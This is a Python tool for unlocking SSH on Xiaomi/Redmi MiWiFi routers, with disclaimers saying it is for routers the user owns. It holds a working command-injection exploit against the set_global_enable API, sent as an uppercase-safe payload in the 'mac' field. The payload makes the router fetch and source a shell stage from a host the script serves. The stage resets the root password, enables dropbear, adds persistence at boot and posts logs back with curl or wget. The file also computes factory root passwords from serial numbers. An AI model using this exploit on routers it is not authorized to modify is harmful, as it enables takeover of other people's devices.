#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
miwifi_ssh_unlock.py — one-click SSH unlock for Xiaomi / Redmi MiWiFi routers.

    python3 miwifi_ssh_unlock.py --password '你的路由器后台密码'

Pure Python standard library (3.8+), no pip install, no firmware download,
no downgrade, no UART, no disassembly. Works on macOS / Linux / Windows.

--------------------------------------------------------------------------
!! USE ONLY ON A ROUTER YOU OWN OR ARE EXPLICITLY AUTHORIZED TO MODIFY !!
Enabling SSH voids the warranty. Improper use can brick the device.
Unauthorised access to someone else's equipment is illegal (in mainland
China: Criminal Law art. 285). The requirement to supply the WEB admin
password (or an admin stok) is an intentional authorization gate.
--------------------------------------------------------------------------

Background
----------
Most older "4 x curl" one-liners target /api/xqsystem/start_binding and are
patched on newer firmware (they return code 1523, or code 0 without actually
executing anything). This script uses the 2026 chain:

  POST /cgi-bin/luci/;stok=<stok>/api/device_security/local_access/set_global_enable

The controller reads the whole parameter table at once (bypassing the usual
hackCheck / macaddr validation), upper-cases `mac`, then interpolates it
unescaped into a root-level os.execute("milog.sh -m '...'"). Constraints:

  * `;` and `&` are consumed by urldecode_params -> use `|` and newlines
  * the payload is upper-cased -> it must contain no functional lowercase
  * curl is reached with a glob; the stage script is pulled over HTTP and
    sourced straight from a pipe, so nothing is written to the router's disk

Known affected firmware branches (static census of 60 official ROMs, see
https://github.com/leafnsand/xiaomi-rp01-root ): RP01 1.0.67, RP02 1.0.46,
RP03 1.0.63, RP04 1.0.89, RP09 1.0.44, RN01 1.0.74, RN02 1.0.64 (BE6500),
RN04 1.0.94, RD01 1.0.52, RD02 1.0.39, RD03V2 2.0.12, RD08 1.1.96.

Troubleshooting: if no callback arrives, your OS firewall is probably blocking
the inbound stage request. Try --lhost <your LAN IP>, allow Python inbound,
and self-test http://<lhost>:<port>/S from another device on the LAN.
A {"code":0} response alone does NOT prove the command executed.
"""

import argparse
import getpass
import hashlib
import http.server
import json
import os
import random
import re
import socket
import ssl
import sys
import threading
import time
import urllib.parse
import urllib.request

KNOWN_VULNERABLE = {
    "RP01": "1.0.67", "RP02": "1.0.46", "RP03": "1.0.63", "RP04": "1.0.89",
    "RP09": "1.0.44", "RN01": "1.0.74", "RN02": "1.0.64", "RN04": "1.0.94",
    "RD01": "1.0.52", "RD02": "1.0.39", "RD03V2": "2.0.12", "RD08": "1.1.96",
}

SALT_WITH_SLASH = "6d2df50a-250f-4a30-a5e6-d44fb0960aa0"
SALT_NO_SLASH = "A2E371B0-B34B-48A5-8C40-A7133F3B5D88"

DISCLAIMER = (
    "本工具仅可用于你自己拥有或已获明确授权的小米/红米路由器。\n"
    "开启 SSH 会失去官方保修，操作不当可能变砖；未经授权入侵他人设备属违法行为。\n"
    "Only use this on a router you own or are explicitly authorized to modify."
)


def calc_root_password(sn):
    """Xiaomi factory root password: md5(SN + salt)[:8]."""
    salt = SALT_WITH_SLASH if "/" in sn else SALT_NO_SLASH
    return hashlib.md5((sn + salt).encode("utf-8")).hexdigest()[:8]


def detect_lhost(router_ip):
    """Pick the local interface IP that can reach the router."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((router_ip, 80))
        return s.getsockname()[0]
    finally:
        s.close()


class Router:
    def __init__(self, ip, scheme="http", timeout=5):
        self.ip = ip
        self.scheme = scheme
        self.timeout = timeout
        ctx = ssl._create_unverified_context()   # routers use self-signed certs
        # bypass the OS/system HTTP proxy: this is a LAN request
        self.opener = urllib.request.build_opener(
            urllib.request.ProxyHandler({}),
            urllib.request.HTTPSHandler(context=ctx),
        )
        self.stok = None
        self.device_id = None
        self.key = None
        self.encrypt_mode = 0
        self.hardware = "?"
        self.romversion = "?"
        self.sn = ""
        self.fac = {}

    def fetch(self, path, data=None, timeout=None):
        req = urllib.request.Request(f"{self.scheme}://{self.ip}{path}", data=data)
        req.add_header("User-Agent", "curl/8.4.0")
        if data is not None:
            req.add_header("Content-Type",
                           "application/x-www-form-urlencoded; charset=UTF-8")
        with self.opener.open(req, timeout=timeout or self.timeout) as r:
            return r.read().decode("utf-8", "replace")

    def detect(self):
        page = self.fetch("/cgi-bin/luci/web")
        m = re.search(r"var deviceId = '([^']+)'", page)
        self.device_id = m.group(1) if m else None
        m = re.search(r"key:\s*'([^']+)'", page)
        self.key = m.group(1) if m else None
        m = re.search(r"newEncryptMode\s*=\s*parseInt\('(\d+)'\)", page)
        page_mode = int(m.group(1)) if m else 0

        info = json.loads(self.fetch("/cgi-bin/luci/api/xqsystem/init_info"))
        self.hardware = str(info.get("hardware", "?")).upper()
        self.romversion = str(info.get("romversion", "?"))
        self.sn = str(info.get("id", ""))
        self.encrypt_mode = int(info.get("newEncryptMode", page_mode) or 0)
        if info.get("inited") != 1:
            raise RuntimeError("路由器尚未完成初始化，请先在 Web 后台走完向导。")
        try:
            self.fac = json.loads(self.fetch("/cgi-bin/luci/api/xqsystem/fac_info"))
        except Exception:
            self.fac = {}
        return info

    def _hash(self, text):
        h = hashlib.sha256 if self.encrypt_mode == 1 else hashlib.sha1
        return h(text.encode("utf-8")).hexdigest()

    def login(self, password):
        """Log in with the WEB admin password and return a fresh stok."""
        if not (self.device_id and self.key):
            raise RuntimeError("无法从登录页提取 deviceId/key：确认是小米原厂固件。")
        nonce = "0_{}_{}_{}".format(self.device_id, int(time.time()),
                                    random.randint(1000, 10000))
        pwd_hash = self._hash(nonce + self._hash(password + self.key))
        body = urllib.parse.urlencode({
            "username": "admin", "password": pwd_hash,
            "logtype": "2", "nonce": nonce,
        }).encode()
        text = self.fetch("/cgi-bin/luci/api/xqsystem/login", data=body)
        m = re.search(r'"token"\s*:\s*"([^"]+)"', text)
        if not m:
            raise RuntimeError("登录失败：后台密码不对，或固件使用了不同的登录方式。"
                               f"响应: {text[:160]}")
        self.stok = m.group(1)
        return self.stok

    def api(self, path, data=None, timeout=None):
        return self.fetch(f"/cgi-bin/luci/;stok={self.stok}{path}",
                          data=data, timeout=timeout)


STAGE_TEMPLATE = r"""#!/bin/sh
LOG=/tmp/miwifi_ssh_unlock.log
{
  echo "=== device ==="
  id
  cat /etc/openwrt_release 2>/dev/null | head -n 3
  echo "=== enable factory flags ==="
  nvram set ssh_en=1
  nvram set telnet_en=1
  nvram set uart_en=1
  nvram set boot_wait=on
  nvram commit
  echo "ssh_en=$(nvram get ssh_en) telnet_en=$(nvram get telnet_en)"
  echo "=== root password ==="
  printf '%s\n%s\n' '__PASSWORD__' '__PASSWORD__' | passwd root
  echo "=== start dropbear ==="
  sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear
  mkdir -p /etc/dropbear
  /etc/init.d/dropbear enable
  /etc/init.d/dropbear restart
__PERSIST__
  echo "=== verify ==="
  ps w | grep -i dropbear
  netstat -lnp | grep ':22'
  echo "=== done ==="
} > "$LOG" 2>&1
curl -s -m 8 --data-binary @"$LOG" __CALLBACK__ >/dev/null 2>&1 ||
  wget -q -O /dev/null --post-file="$LOG" __CALLBACK__ >/dev/null 2>&1
"""

PERSIST_BLOCK = r"""  echo "=== install soft persistence ==="
  # /etc is a ramfs on MiWiFi: dropbear's init script, rc.d link, host key
  # and /etc/shadow all vanish on reboot. /data (ubifs) survives, and
  # "uci commit" is mirrored into /data/etc/config, so a firewall include
  # script is enough to bring SSH back on every boot.
  mkdir -p /data/auto_ssh/keys
  cp -a /etc/dropbear/. /data/auto_ssh/keys/ 2>/dev/null
  chmod 600 /data/auto_ssh/keys/* 2>/dev/null
  cat > /data/auto_ssh/auto_ssh.sh <<'PERSIST_EOF'
#!/bin/sh
# soft persistence: re-enable dropbear after reboot (idempotent)
if pidof dropbear >/dev/null 2>&1; then exit 0; fi
sleep 5
mkdir -p /etc/dropbear
cp -a /data/auto_ssh/keys/. /etc/dropbear/ 2>/dev/null
chmod 600 /etc/dropbear/* 2>/dev/null
sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear || exit 1
nvram set ssh_en=1
/etc/init.d/dropbear enable
/etc/init.d/dropbear restart
PERSIST_EOF
  chmod 755 /data/auto_ssh/auto_ssh.sh
  sh -n /data/auto_ssh/auto_ssh.sh || echo "WARN: persist script syntax error"
  uci set firewall.auto_ssh=include
  uci set firewall.auto_ssh.type='script'
  uci set firewall.auto_ssh.path='/data/auto_ssh/auto_ssh.sh'
  uci set firewall.auto_ssh.enabled='1'
  uci commit firewall
"""

VERIFY_BODY = r"""  echo "=== uptime (did the router reboot?) ==="
  uptime
  echo "=== nvram ==="
  printf 'SSH_EN=%s\n' "$(nvram get ssh_en)"
  echo "=== port 22 ==="
  netstat -lnp 2>/dev/null | grep ':22 ' | head -n 2
  echo "=== dropbear channel ==="
  grep -n 'channel=' /etc/init.d/dropbear | head -n 3
  echo "=== persist script ==="
  ls -l /data/auto_ssh/auto_ssh.sh 2>&1
  [ -x /data/auto_ssh/auto_ssh.sh ] && echo 'CHECK_SCRIPT=OK' || echo 'CHECK_SCRIPT=FAIL'
  sh -n /data/auto_ssh/auto_ssh.sh && echo 'CHECK_SYNTAX=OK' || echo 'CHECK_SYNTAX=FAIL'
  echo "=== firewall include (runtime) ==="
  uci show firewall.auto_ssh 2>&1
  uci get firewall.auto_ssh.path >/dev/null 2>&1 && echo 'CHECK_INCLUDE=OK' || echo 'CHECK_INCLUDE=FAIL'
  echo "=== firewall include (persisted in /data) ==="
  grep -A4 "config include 'auto_ssh'" /data/etc/config/firewall 2>&1 | head -n 6
  grep -q "config include 'auto_ssh'" /data/etc/config/firewall 2>/dev/null && echo 'CHECK_PERSISTED=OK' || echo 'CHECK_PERSISTED=FAIL'
  echo "=== host key backup match ==="
  md5sum /etc/dropbear/dropbear_rsa_host_key /data/auto_ssh/keys/dropbear_rsa_host_key 2>&1
  echo "=== root password persisted ==="
  grep '^root:' /data/etc/shadow 2>&1 | cut -c1-20
"""

ROLLBACK_BODY = r"""  echo "=== remove firewall include ==="
  uci delete firewall.auto_ssh 2>&1
  uci commit firewall
  echo "=== remove /data/auto_ssh ==="
  rm -rf /data/auto_ssh
  echo "=== verify removal ==="
  uci get firewall.auto_ssh 2>&1
  ls -ld /data/auto_ssh 2>&1
  echo "=== note: the live SSH session and nvram flags are left untouched ==="
"""

TASK_BODIES = {
    "persist-only": PERSIST_BLOCK,
    "verify": VERIFY_BODY,
    "rollback": ROLLBACK_BODY,
}


def wrap_stage(body, callback):
    """Wrap a task body into a stage that ships its log back to this host."""
    return ("#!/bin/sh\n"
            "LOG=/tmp/miwifi_ssh_task.log\n"
            "{\n" + body.rstrip("\n") + "\n"
            "} > \"$LOG\" 2>&1\n"
            "curl -s -m 8 --data-binary @\"$LOG\" __CALLBACK__ >/dev/null 2>&1 ||\n"
            "  wget -q -O /dev/null --post-file=\"$LOG\" __CALLBACK__ >/dev/null 2>&1\n"
            ).replace("__CALLBACK__", callback)


def build_stage(password, callback, persist):
    return (STAGE_TEMPLATE
            .replace("__PASSWORD__", password)
            .replace("__CALLBACK__", callback)
            .replace("__PERSIST__", PERSIST_BLOCK if persist else
                     "  echo '(persistence skipped)'"))


def build_payload(lhost, port):
    """Uppercase-safe payload; every separator is percent-encoded."""
    lines = [
        "x' #",
        "A=${PATH#*:}",
        "C=${A%%:*}",
        "$C/???? HTTP://{}:{}/S| . /[!0-9][!0-9][!0-9][!0-9]"
        "/[!0-9][!0-9][!0-9][!0-9]/??/0 #".format(lhost, port),
    ]
    return "mac=" + urllib.parse.quote("\n".join(lines), safe="") + "&enable=1"


def port_banner(ip, port=22, timeout=2):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        raw = s.recv(80).decode("utf-8", "replace")
        return raw.splitlines()[0].strip() if raw else None
    except Exception:
        return None
    finally:
        s.close()


def run(args):
    mode = ("verify" if args.verify else
            "persist-only" if args.persist_only else
            "rollback" if args.rollback else "unlock")
    r = Router(args.ip, args.scheme, args.timeout)
    print(f"[1/6] 连接路由器 {r.scheme}://{args.ip} ... （模式 {mode}）")
    r.detect()
    pwd = args.ssh_password or calc_root_password(r.sn)
    print(f"      型号 {r.hardware} / 固件 {r.romversion} / SN {r.sn}")
    print(f"      出厂 root 密码 {pwd}   fac_info: {r.fac}")

    expected = KNOWN_VULNERABLE.get(r.hardware)
    if expected and expected != r.romversion:
        print(f"      ! 该型号已验证的版本是 {expected}，当前 {r.romversion}，"
              "结果未经验证（仍会尝试）")
    elif not expected:
        print("      ! 该型号不在已知受影响名单里，仍会尝试，失败属正常")

    if args.info:
        print("\n仅查询模式，未做任何修改。")
        return 0

    # Quick post-reboot check needs no credentials at all: port 22 + fac_info
    # (both are reachable without a valid stok). Deep checks need a token.
    if (mode == "verify" and not args.dry_run and
            not (args.stok or args.password or os.environ.get("MIWIFI_PASSWORD"))):
        banner = port_banner(args.ip)
        print("\n[快速体检] 无需凭据，只检查 SSH 是否真的在线")
        print(f"  22 端口    : {banner or '未开放'}")
        print(f"  fac_info.ssh: {r.fac.get('ssh')}  （标志位，不代表服务在跑）")
        if banner:
            print("  结论: SSH 在线。若刚重启过，说明固化已生效。")
            print("  7 项深度体检（脚本/落盘/密钥）：加 --password '后台密码' --verify")
        else:
            print("  结论: SSH 不通。若刚重启过，固化未生效；"
                  "用 --password '后台密码' --force 重跑解锁。")
        return 0 if banner else 1

    if mode == "unlock":
        already = bool(r.fac.get("ssh")) and port_banner(args.ip)
        if already and not args.force:
            print("\nSSH 已经是开启状态，无需重复解锁。")
            print("后续维护：--verify 体检 / --persist-only 只重装固化 / "
                  "--rollback 卸载；或加 --force 重跑完整解锁。")
            return 0

    # ---- authorization gate -------------------------------------------
    if args.stok:
        r.stok = args.stok
        print("[2/6] 使用提供的 stok。")
        if not args.dry_run:
            try:
                probe = r.api("/api/misystem/sys_info")
                if "Invalid token" in probe or re.search(r'"code"\s*:\s*401', probe):
                    raise RuntimeError(
                        "这个 stok 已失效（路由器返回 Invalid token）。\n"
                        "请重新登录 WEB 后台取新 stok，或改用 --password '后台密码'"
                        " 让脚本自动登录。")
            except RuntimeError:
                raise
            except Exception:
                pass  # 个别型号没有这个接口，交由后续注入结果判断
    else:
        webpwd = args.password or os.environ.get("MIWIFI_PASSWORD")
        if not webpwd:
            if not sys.stdin.isatty():
                raise RuntimeError("请用 --password / 环境变量 MIWIFI_PASSWORD "
                                   "提供后台密码，或用 --stok 提供 token。")
            webpwd = getpass.getpass("路由器 WEB 后台密码: ")
        r.login(webpwd)
        print(f"[2/6] 登录成功，stok={r.stok[:8]}...（已截断，不会写入日志）")

    # --verify runs read-only shell commands only; no ownership prompt needed.
    if not args.yes and mode != "verify":
        print("\n" + DISCLAIMER + "\n")
        if not sys.stdin.isatty():
            raise RuntimeError("非交互环境请显式加 --yes 表示你确认设备归属。")
        answer = input("这台路由器是你自己的吗？输入 yes 继续: ").strip().lower()
        if answer != "yes":
            print("已取消。")
            return 1

    # ---- stage server --------------------------------------------------
    lhost = args.lhost or detect_lhost(args.ip)
    state = {"stage_fetched": threading.Event(),
             "report": threading.Event(), "reports": []}
    stage_box = {"text": ""}

    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _reply(self, body=b""):
            self.send_response(200 if body else 204)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            if body:
                self.wfile.write(body)

        def do_GET(self):
            if self.path.startswith("/S"):
                state["stage_fetched"].set()
                self._reply(stage_box["text"].encode())
            elif self.path.startswith("/report") or self.path.startswith("/done"):
                state["report"].set()
                self._reply(b"ok")
            else:
                self.send_error(404)

        def do_POST(self):
            if self.path.startswith("/report"):
                n = int(self.headers.get("Content-Length", 0))
                state["reports"].append(
                    self.rfile.read(n).decode("utf-8", "replace"))
                state["report"].set()
                self._reply(b"ok")
            else:
                self.send_error(404)

    try:
        srv = http.server.ThreadingHTTPServer(("0.0.0.0", args.lport), Handler)
    except OSError:
        print(f"      ! 端口 {args.lport} 被占用，改用系统分配的空闲端口")
        srv = http.server.ThreadingHTTPServer(("0.0.0.0", 0), Handler)
    port = srv.server_address[1]
    callback = f"http://{lhost}:{port}/report"
    if args.cmd:
        stage = wrap_stage(args.cmd, callback)
    elif mode == "unlock":
        stage = build_stage(pwd, callback, not args.no_persist)
    else:
        stage = wrap_stage(TASK_BODIES[mode], callback)
    stage_box["text"] = stage
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"[3/6] stage 服务 http://{lhost}:{port}/S "
          f"（若路由器连不上，请检查系统防火墙并指定 --lhost）")

    if args.dry_run:
        print("\n--- dry-run: payload ---")
        print(build_payload(lhost, port))
        print("--- dry-run: stage ---")
        print(stage)
        srv.shutdown()
        return 0

    # ---- inject --------------------------------------------------------
    payload = build_payload(lhost, port)
    print("[4/6] 注入 set_global_enable ...")
    try:
        resp = r.api("/api/device_security/local_access/set_global_enable",
                     data=payload.encode(), timeout=10)
        print(f"      API 返回 {resp[:120]}  （code:0 不代表命令已执行）")
    except Exception as e:
        print(f"      API 异常（可忽略，以回连为准）: {type(e).__name__}: {e}")

    ok = state["stage_fetched"].wait(args.wait)
    print(f"[5/6] 路由器是否取回 stage: {'是' if ok else '否'}")
    if ok:
        state["report"].wait(min(args.wait, 10))
    srv.shutdown()
    srv.server_close()

    if state["reports"]:
        print("\n--- 路由器执行日志 ---")
        print("\n".join(state["reports"])[:4000])

    if not ok:
        print("\n注入没有生效。排查顺序：")
        print(f"  1) 在局域网另一台设备打开 http://{lhost}:{port}/S 验证连通性")
        print("  2) 放行本机防火墙对 Python 的入站连接（Windows 最常见）")
        print(f"  3) 用 --lhost {lhost} 显式指定本机 LAN IP")
        print("  4) 用 --info 确认型号/固件，换用该型号对应的方案")
        return 1

    # ---- verify --------------------------------------------------------
    banner = None
    for _ in range(6):
        banner = port_banner(args.ip)
        if banner:
            break
        time.sleep(1)
    try:
        fac = json.loads(r.api("/api/xqsystem/fac_info"))
    except Exception:
        fac = {}
    print("[6/6] 验证结果")
    print(f"      端口 22 : {banner or '未开放'}")
    print(f"      fac_info: {fac}")

    print("\n" + "=" * 58)
    if mode == "verify":
        log = "\n".join(state["reports"])
        keys = re.findall(r"([0-9a-f]{32})\s+/", log)
        checks = [
            ("开机自启脚本存在且可执行", "CHECK_SCRIPT=OK" in log),
            ("固化脚本语法正确", "CHECK_SYNTAX=OK" in log),
            ("firewall include 已配置", "CHECK_INCLUDE=OK" in log),
            ("配置已落盘 /data", "CHECK_PERSISTED=OK" in log),
            ("host key 备份与运行中一致", len(keys) >= 2 and keys[0] == keys[1]),
            ("nvram ssh_en=1", "SSH_EN=1" in log),
            ("22 端口正在监听", ":22 " in log and "LISTEN" in log),
        ]
        print(" 固化体检（重启后跑这个模式最有用）")
        for name, good in checks:
            print(f"   [{'OK' if good else 'FAIL'}] {name}")
        print("\n 若重启后 22 端口不通：重跑完整解锁并加 --force。")
        print("=" * 58)
        return 0 if all(good for _, good in checks) else 1
    if mode == "rollback":
        print(" 已卸载软固化（当前 SSH 会话与 nvram 开关未改动）")
        print("=" * 58)
        return 0
    if mode == "persist-only":
        print(" 已重装软固化：/data/auto_ssh/auto_ssh.sh + firewall include")
        print("=" * 58)
        return 0
    if banner:
        print(" SSH 已开启")
        print(f"   ssh -o HostKeyAlgorithms=+ssh-rsa root@{args.ip}")
        print(f"   用户名 root   密码 {pwd}")
    else:
        print(" 已拿到 root 命令执行，但 22 端口未起来，见上方路由器日志。")
    if not args.no_persist:
        print(" 已安装软固化：/data/auto_ssh/auto_ssh.sh + firewall include")
        print("   host key 已备份到 /data，重启后不会报 host key changed")
        print("   重启后可用 --verify 体检；固件升级 / 恢复出厂需 --persist-only 重装")
    print(" 建议：登录后执行 passwd root 改掉出厂密码；重新登录后台使 stok 失效。")
    print("=" * 58)
    return 0 if banner else 1


def main():
    p = argparse.ArgumentParser(
        description="一键开启小米/红米路由器 SSH（仅限自有设备）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""示例:
  一键解锁（默认同时装好固化）
    python3 miwifi_ssh_unlock.py --password '后台密码'
  重启后快速体检（无需密码，只看 22 端口）
    python3 miwifi_ssh_unlock.py --verify
  重启后 7 项深度体检（需后台密码）
    python3 miwifi_ssh_unlock.py --password '后台密码' --verify
  固件升级 / 恢复出厂后只补固化，不重复解锁
    python3 miwifi_ssh_unlock.py --stok <stok> --persist-only --yes
  卸载固化
    python3 miwifi_ssh_unlock.py --stok <stok> --rollback --yes
  其它
    python3 miwifi_ssh_unlock.py --info
    python3 miwifi_ssh_unlock.py --password '后台密码' --no-persist
    python3 miwifi_ssh_unlock.py --stok <stok> --yes --cmd 'uptime'
""")
    p.add_argument("--ip", default="192.168.31.1", help="路由器地址")
    p.add_argument("--scheme", choices=["http", "https"], default="http")
    p.add_argument("--password", help="WEB 后台密码（也可设 MIWIFI_PASSWORD 环境变量）")
    p.add_argument("--stok", help="已登录的 stok，跳过登录")
    p.add_argument("--ssh-password", help="自定义 SSH root 密码，默认按 SN 计算")
    p.add_argument("--lhost", help="本机可被路由器访问的 LAN IP，默认自动探测")
    p.add_argument("--lport", type=int, default=8000, help="stage HTTP 端口，默认 8000")
    p.add_argument("--wait", type=int, default=15, help="等待回连秒数，默认 15")
    p.add_argument("--timeout", type=int, default=5, help="HTTP 超时秒数")
    p.add_argument("--no-persist", action="store_true", help="不安装开机自启固化")
    p.add_argument("--verify", action="store_true",
                   help="只读体检：固化脚本、include 落盘、host key、22 端口")
    p.add_argument("--persist-only", action="store_true",
                   help="不解锁，只重装开机自启固化（固件升级/恢复出厂后）")
    p.add_argument("--rollback", action="store_true",
                   help="卸载软固化：删除 firewall include 与 /data/auto_ssh")
    p.add_argument("--force", action="store_true", help="SSH 已开启时也重新执行")
    p.add_argument("--yes", action="store_true", help="跳过设备归属确认（非交互必需）")
    p.add_argument("--info", action="store_true", help="只读：查看设备信息与 root 密码")
    p.add_argument("--dry-run", action="store_true", help="只打印 payload/stage，不注入")
    p.add_argument("--cmd", help="高级：把这段 shell 脚本作为 stage 执行")
    args = p.parse_args()
    if sum(bool(x) for x in (args.verify, args.persist_only, args.rollback)) > 1:
        print("错误: --verify / --persist-only / --rollback 只能选一个。")
        return 1
    if args.ssh_password and re.search(r"['\"\\\r\n\x00-\x1f]", args.ssh_password):
        print("错误: --ssh-password 不能包含引号、反斜杠、换行或控制字符"
              "（它会被写进路由器 shell 脚本）。")
        return 1
    try:
        return run(args)
    except KeyboardInterrupt:
        print("\n已中断。")
        return 130
    except RuntimeError as e:
        print(f"错误: {e}")
        return 1
    except Exception as e:
        print(f"\n错误: {type(e).__name__}: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
